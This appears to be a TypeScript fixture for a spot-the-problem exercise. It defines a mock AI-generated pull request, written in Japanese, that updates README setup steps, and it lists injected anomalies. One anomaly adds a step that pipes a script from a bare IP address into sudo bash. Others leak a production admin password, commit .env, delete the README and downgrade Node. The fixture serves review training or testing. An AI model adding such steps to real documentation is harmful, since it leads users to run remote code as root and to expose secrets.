import { bodyEdit } from "../../anomalies";
import type { Baseline } from "..";
import { codebotPullRequest } from "../codebot";

export const readmeSetup: Baseline = {
  id: "readme-setup",
  pullRequest: codebotPullRequest({
    title: "README のセットアップ手順を更新",
    baseBranch: "main",
    headBranch: "docs/update-setup-guide",
    openedAgo: "40 分前",
    labels: ["documentation", "ai-generated"],
    commits: 1,
    filesChanged: 1,
    additions: 23,
    deletions: 11,
    body: `## 概要

README のセットアップ手順が古くなっていたため、現在の手順に合わせて更新しました。

## 変更内容

- 必要な Node.js のバージョンを 18 から 22 に更新
- \`npm install\` の前に \`.env.example\` を \`.env\` にコピーする手順を追加
- 開発用の管理者アカウントを作るコマンドを追記

## テスト

- [x] 既存のテストがすべて通ることを確認
- [x] ローカル環境で動作確認

## 備考

破壊的変更はありません。
レビューよろしくお願いします 🙏

Closes #76`,
  }),
  anomalies: [
    bodyEdit(
      "production-password",
      "本番のパスワード",
      "- 開発用の管理者アカウントを作るコマンドを追記",
      "- 本番の管理者アカウントのパスワード（`hunter2`）を追記",
    ),
    bodyEdit(
      "curl-sudo-bash",
      "謎のインストールスクリプト",
      "- 開発用の管理者アカウントを作るコマンドを追記",
      "- 開発用の管理者アカウントを作るコマンドを追記\n- 最初に `curl http://203.0.113.8/install.sh | sudo bash` を実行する手順を追加",
    ),
    bodyEdit(
      "env-committed",
      "コミットされた .env",
      "- `npm install` の前に `.env.example` を `.env` にコピーする手順を追加",
      "- コピーの手間を省くため、`.env` をそのままリポジトリに追加",
    ),
    bodyEdit(
      "readme-deleted",
      "README の削除",
      "現在の手順に合わせて更新しました。",
      "README を削除しました。",
    ),
    bodyEdit(
      "ask-the-ai",
      "AI に聞いてください",
      "- 開発用の管理者アカウントを作るコマンドを追記",
      "- 開発用の管理者アカウントを作るコマンドを追記\n- その他の手順は「AI に聞いてください」の一文にまとめて簡略化",
    ),
    bodyEdit("node-8", "Node.js 8", "18 から 22 に更新", "18 から 8 に更新"),
  ],
  mergedMessage: "README のセットアップ手順が新しくなりました。",
};
